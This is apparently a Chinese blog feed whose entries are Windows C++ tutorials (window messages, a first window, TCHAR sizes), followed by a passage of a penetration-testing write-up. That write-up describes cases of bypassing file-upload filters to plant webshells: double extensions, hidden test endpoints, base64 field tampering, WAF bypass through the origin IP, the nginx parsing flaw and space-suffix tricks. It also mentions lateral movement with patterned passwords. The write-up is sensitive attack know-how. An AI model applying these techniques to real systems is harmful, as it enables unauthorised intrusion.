(uMsg)<br>&#123;<br><span class="hljs-keyword">case</span> WM_CREATE:<br><span class="hljs-built_in">MessageBoxW</span>(hwnd, <span class="hljs-string">L&quot;窗口创建了&quot;</span>, <span class="hljs-string">L&quot;提示&quot;</span>, MB_OK);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> WM_CLOSE:<br><span class="hljs-built_in">MessageBoxW</span>(hwnd, <span class="hljs-string">L&quot;窗口关闭了&quot;</span>, <span class="hljs-string">L&quot;提示&quot;</span>, MB_OK);<br><span class="hljs-built_in">DestroyWindow</span>(hwnd);<br><span class="hljs-built_in">PostQuitMessage</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> WM_MOUSEMOVE:<br><span class="hljs-comment">//print(L&quot;鼠标移动了！/n,%d&quot;,a);</span><br><span class="hljs-comment">//a++;</span><br>&#123;<br>WORD X = <span class="hljs-built_in">LOWORD</span>(lParam);<br>WORD Y = <span class="hljs-built_in">HIWORD</span>(lParam);<br><span class="hljs-built_in">print</span>(<span class="hljs-string">L&quot;鼠标移动了！X坐标%d,Y坐标%d&quot;</span>, X, Y);<br><span class="hljs-keyword">break</span>; <br>&#125;<br><span class="hljs-keyword">case</span> WM_LBUTTONDOWN:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">L&quot;鼠标左键按下了/n&quot;</span>);<br><span class="hljs-built_in">SendMessageW</span>(hwnd, WM_USERMSG, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">case</span> WM_USERMSG:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">L&quot;自定义消息！/n&quot;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">DefWindowProcW</span>(hwnd, uMsg, wParam, lParam);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> WINAPI <span class="hljs-title">WinMain</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ HINSTANCE hInstance,      <span class="hljs-comment">// handle to current instance</span></span></span><br><span class="hljs-params"><span class="hljs-function">_In_opt_ HINSTANCE hPrevInstance,  <span class="hljs-comment">// handle to previous instance</span></span></span><br><span class="hljs-params"><span class="hljs-function">_In_ LPSTR lpCmdLine,          <span class="hljs-comment">// command line</span></span></span><br><span class="hljs-params"><span class="hljs-function">_In_ <span class="hljs-keyword">int</span> nCmdShow              <span class="hljs-comment">// show state</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//创建一个窗口类</span><br>WNDCLASSW myClass = &#123; <span class="hljs-number">0</span> &#125;;<br>myClass.lpszClassName = <span class="hljs-string">L&quot;51hook&quot;</span>;<br>myClass.lpfnWndProc = WindowProc;<br><span class="hljs-comment">//2.注册窗口类</span><br><span class="hljs-built_in">RegisterClassW</span>(&amp;myClass);<br><span class="hljs-comment">//3.创建窗口</span><br>HWND hwnd = <span class="hljs-built_in">CreateWindowW</span>(<br>myClass.lpszClassName,<br><span class="hljs-string">L&quot;51hook&quot;</span>,<br>WS_OVERLAPPEDWINDOW,<br>CW_USEDEFAULT,<br><span class="hljs-number">0</span>,<br>CW_USEDEFAULT,<br><span class="hljs-number">0</span>,<br><span class="hljs-literal">NULL</span>,<br><span class="hljs-literal">NULL</span>,<br>hInstance,<br><span class="hljs-number">0</span><br>);<br><br><span class="hljs-comment">//4.显示窗口</span><br><span class="hljs-built_in">ShowWindow</span>(hwnd, SW_SHOWNORMAL);<br><span class="hljs-comment">//5.获取消息</span><br><br>MSG msg = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">GetMessageW</span>(&amp;msg,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))&#123;<br><span class="hljs-built_in">DispatchMessage</span>(&amp;msg);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E6%B6%88%E6%81%AF%E5%A4%84%E7%90%86/5.png" alt="5"></p><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E6%B6%88%E6%81%AF%E5%A4%84%E7%90%86/6.png" alt="6"></p><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E6%B6%88%E6%81%AF%E5%A4%84%E7%90%86/7.png" alt="7"></p>]]></content>
    
    
    <categories>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows编程第一个窗口程序</title>
    <link href="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%AA%97%E5%8F%A3%E7%A8%8B%E5%BA%8F/"/>
    <url>/2021/08/23/windows%E7%BC%96%E7%A8%8B%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%AA%97%E5%8F%A3%E7%A8%8B%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%AA%97%E5%8F%A3%E7%A8%8B%E5%BA%8F/1.png" alt="1"></p><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%AA%97%E5%8F%A3%E7%A8%8B%E5%BA%8F/2.png" alt="2"></p><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%AA%97%E5%8F%A3%E7%A8%8B%E5%BA%8F/3.png" alt="3"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tagWNDCLASSW</span> &#123;</span><br>  UINT      style;<br>  WNDPROC   lpfnWndProc;<br>  <span class="hljs-keyword">int</span>       cbClsExtra;<br>  <span class="hljs-keyword">int</span>       cbWndExtra;<br>  HINSTANCE hInstance;<br>  HICON     hIcon;<br>  HCURSOR   hCursor;<br>  HBRUSH    hbrBackground;<br>  LPCWSTR   lpszMenuName;<br>  LPCWSTR   lpszClassName;<br>&#125; WNDCLASSW, *PWNDCLASSW, *NPWNDCLASSW, *LPWNDCLASSW;<br></code></pre></td></tr></table></figure><blockquote><p>核心的是WNDPROC  和 LPCWSTP lpszClassName    这两个必须有值</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-function">LRESULT CALLBACK <span class="hljs-title">WindowProc</span><span class="hljs-params">(   <span class="hljs-comment">//消息处理函数</span></span></span><br><span class="hljs-params"><span class="hljs-function">_In_ HWND   hwnd,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ UINT   uMsg,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ WPARAM wParam,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ LPARAM lParam</span></span><br><span class="hljs-params"><span class="hljs-function">)</span> </span>&#123;<br><span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (uMsg)<br>&#123;<br><span class="hljs-keyword">case</span> WM_CREATE:<br><span class="hljs-built_in">MessageBoxW</span>(hwnd, <span class="hljs-string">L&quot;窗口创建了&quot;</span>, <span class="hljs-string">L&quot;提示&quot;</span>, MB_OK);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> WM_CLOSE:<br><span class="hljs-built_in">MessageBoxW</span>(hwnd, <span class="hljs-string">L&quot;窗口关闭了&quot;</span>, <span class="hljs-string">L&quot;提示&quot;</span>, MB_OK);<br><span class="hljs-built_in">DestroyWindow</span>(hwnd);<br><span class="hljs-built_in">PostQuitMessage</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">DefWindowProcW</span>(hwnd,uMsg,wParam,lParam);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> WINAPI <span class="hljs-title">WinMain</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hPreInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">LPSTR lpCmdeLine,</span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> nCmdShow</span></span><br><span class="hljs-params"><span class="hljs-function">)</span> </span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//1.创建一个窗口类</span><br>WNDCLASSW myClass = &#123; <span class="hljs-number">0</span> &#125;;<br>myClass.lpszClassName = <span class="hljs-string">L&quot;51hook&quot;</span>;<br>myClass.lpfnWndProc = WindowProc;<br><span class="hljs-comment">//2.注册窗口类</span><br><span class="hljs-built_in">RegisterClassW</span>(&amp;myClass);<br><span class="hljs-comment">//3.创建窗口</span><br>HWND hwindow = <span class="hljs-built_in">CreateWindowW</span>(<br>myClass.lpszClassName,<br> <br><span class="hljs-string">L&quot;51hook&quot;</span>,<br>WS_OVERLAPPEDWINDOW,<br>CW_USEDEFAULT,<br><span class="hljs-number">0</span>,<br>CW_USEDEFAULT,<br><span class="hljs-number">0</span>,<br><span class="hljs-literal">NULL</span>,<br><span class="hljs-literal">NULL</span>,<br>hInstance,<br><span class="hljs-number">0</span><br>);<br><span class="hljs-comment">//4.显示窗口</span><br><span class="hljs-built_in">ShowWindow</span>(hwindow, SW_SHOWNORMAL);<br><br><span class="hljs-comment">//5.获取消息</span><br>MSG msg = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">GetMessageW</span>(&amp;msg, <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)) &#123;<br><span class="hljs-built_in">DispatchMessageW</span>(&amp;msg);<span class="hljs-comment">//分发消息给消息处理函数</span><br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows编程字符串处理</title>
    <link href="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/"/>
    <url>/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/1.png" alt="1"></p><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/2.png" alt="2"></p><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/3.png" alt="3"></p><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/4.png" alt="4"></p><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/5.png" alt="5"></p><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/6.png" alt="6"></p><blockquote><p>tchar 是14的原因是 因为他是由环境决定   当前环境 默认是Unicode的 WCHAR 型   所以  和WCHAR 型的大小一样  如果 改变环境   tchar的大小也会跟着改变</p></blockquote><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/7.png" alt="7"></p><blockquote><p>改变之后  tchar的大小就变为7了</p></blockquote><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/8.png" alt="8"></p><blockquote><p>然后MessageBox函数如果用tchar类型 就不用管环境是什么了  因为tchar自动根据环境来变化</p></blockquote><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/9.png" alt="9"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;tchar.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>CHAR char_buff[] = <span class="hljs-string">&quot;123456&quot;</span>;<br>WCHAR wchar_buff[] = <span class="hljs-string">L&quot;123456&quot;</span>;<br>TCHAR tchar_buff[] = _T(<span class="hljs-string">&quot;123456&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;sizeof char_buff=%d/n&quot;</span>, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(char_buff));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;sizeof wchar_buff=%d/n&quot;</span>, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(wchar_buff));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;sizeof tchar_buff=%d/n&quot;</span>, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(tchar_buff));<br><br><span class="hljs-built_in">MessageBox</span>(<span class="hljs-number">0</span>, _T(<span class="hljs-string">&quot;hello word&quot;</span>), _T(<span class="hljs-string">&quot;标题&quot;</span>), MB_OK);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传绕过思路拓展</title>
    <link href="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/"/>
    <url>/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/</url>
    
    <content type="html"><![CDATA[<h1 id="案例一"><a href="#案例一" class="headerlink" title="案例一"></a>案例一</h1><p>一次项目渗透时，通过往png后缀随便加个字符可知该上传点为白名单上传，正常情况下无法绕过</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/1671284727.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\1.png" alt="img"></a></p><p>通过观察接口信息，发现接口名字为UploadImg，猜测该接口用于图片上传，按照开发的习惯，保不准会存在temp、test，这类的接口，随后通过fuzz找到存在的上传接口（file），但此时的接口（file）上传文件仍旧存在限制，需要绕过。</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/3472946638.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\2.png" alt="img"></a></p><p>由于黑名单限制不够严谨，经过多个伪后缀尝试，发现.cer后缀可绕过限制并被解析</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/1665683640.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\3.png" alt="img"></a></p><p>然后就getshell进内网，后面的操作就不多说了。</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/2197535020.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\4.png" alt="img"></a></p><p>但并非往png后加个特殊字符能认为它是白名单不能进行绕过了，下面举个例子：</p><p>看到这种情况估计不少师傅都会认为后端做了白名单限制上传了吧，接着往下看，怎么去绕过它。</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/926208312.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\5.png" alt="img"></a></p><p>错误回显提示了只能上传ppt/pptx/doc/docx/xls/xlsx/rar/jpg/png类型，但在后续的测试中，发现了types类型可控，且在存在多个后缀的情况下，后端只保留最后一个后缀，并重命名文件，所以只要上传后缀包含了白名单限制内的类型即可绕过，如（test.png.jsp），只会保留.jsp后缀，如下：</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/1433005059.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\6.png" alt="img"></a></p><p>很多师傅看到白名单上传就会认为这个上传点足够安全，无法绕过，但其实不然，在存在多个上传接口的情况下，或许会存在没做限制，或者限制不严格的上传点也不一定，关键的是我们要如何发现这些接口，在此类接口存在限制时，如何去进行绕过，下面再举一个和接口绕过相关的例子。</p><h1 id="案例二"><a href="#案例二" class="headerlink" title="案例二"></a>案例二</h1><p>upload_2018.php接口白名单上传，在正常情况下，改变后缀会导致上传失败，如下</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/3368800734.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\7.png" alt="img"></a></p><p>再进一步测试时发现存在多个上传接口，删除_2018使用upload接口进行文件上传，可导致任意文件上传</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/1423244665.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\8.png" alt="img"></a></p><p>进一步传shell时发现存在waf（某讯云)，需进一步绕过。</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/2367732524.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\9.png" alt="img"></a></p><p>通过寻找域名真实IP，使用真实IP进行文件上传，绕过waf限制，为防止有心人，这里直接把IP给打码盖住了，以防万一。</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/217557312.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\10.png" alt="img"></a></p><p>很多时候有一些开发为了便捷性，在部署上传接口时限制不够严谨或压根没做限制，这导致一旦被绕过限制传shell，都会导致非常严重的后果，当然，我们可以找一些temp、test这类上传接口，因为此类接口多数是开发过程中用作测试的，这种接口几乎都是无限上传文件类型的，同样的我们也可以找一些api文档进行上传接口的发现，这或许会有惊喜也说不定，之前写过关于接口测试类的安全文章，可参考<a href="https://blog.m1kh.com/index.php/archives/403/">关于Swagger-UI下的渗透实战</a></p><h1 id="案例三"><a href="#案例三" class="headerlink" title="案例三"></a>案例三</h1><p>这是一个把图片转base64的文件上传类型，具体绕过如下：</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/3774740521.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\11.png" alt="img"></a></p><p>通过抓包发现图片是以base64进行上传的，观察了下数据包，发现可通过更改upload_0字段内容上传任意文件</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/2617396617.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\12.png" alt="img"></a></p><p>访问HTML页面，成功被解析，可进一步上传shell获取权限。</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/2627957224.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\13.png" alt="img"></a></p><p>一句话shell上传后发现无法执行命令，之后通过上传PHPinfo发现其存在disable_functions，利用某斯拉绕过限制，getshell</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/1873642010.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\14.png" alt="img"></a></p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/3820787191.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\15.png" alt="img"></a></p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/2700789588.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\16.png" alt="img"></a></p><h1 id="案例四"><a href="#案例四" class="headerlink" title="案例四"></a>案例四</h1><p>一个关于nginx解析漏洞的利用，这个漏洞是很久之前挖到的，这种漏洞现在应该不会存在了，单单是waf都能栏掉，这个就作为思路开拓说一下：</p><p>一次外网打点时发现了目标的一个核心系统，通过踩点发现了某上传功能，但上传接口存在白名单限制，且无其它的上传接口，由于这个站的shell比较重要，必须拿到，之后通过漏洞挖掘，发现目标存在nginx解析漏洞，结合图片上传点成功获取到了内网据点。</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/3593419550.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\17.png" alt="img"></a></p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/1979989394.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\18.png" alt="img"></a></p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/3605815075.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\19.png" alt="img"></a></p><h1 id="案例五"><a href="#案例五" class="headerlink" title="案例五"></a>案例五</h1><p>某次攻防踩点目标时发现了一个上传点，且在信息收集时发现了该目标存在内网环境，进一步想利用该功能点上传shell时却发现存在阻碍，通过fuzz后，发现可用空格绕过限制，最终利用该功能缺陷get shell进内网。</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/3988320782.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\20.png" alt="img"></a></p><p>正常上传.jsp后缀失败，尝试大小写、脏数据填充等也均失败。<br><a href="https://blog.m1kh.com/usr/uploads/2021/06/1628136031.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\21.png" alt="img"></a></p><p>之后留着shell内容不动，更改.jsp后缀为.png，发现可上传成功，由此判断后端不对上传内容做检测，再进一步测试时，发现可利用空格绕过限制上传shell，然后通过读取MSSQL密码，发现内网密码存在规律，最终通过该密码规律内网横向获取到了大量内网机器权限。<br><a href="https://blog.m1kh.com/usr/uploads/2021/06/2309134994.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\22.png" alt="img"></a><br><a href="https://blog.m1kh.com/usr/uploads/2021/06/4116338990.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\23.png" alt="img"></a></p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/3890187884.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\24.png" alt="img"></a></p><h1 id="案例六"><a href="#案例六" class="headerlink" 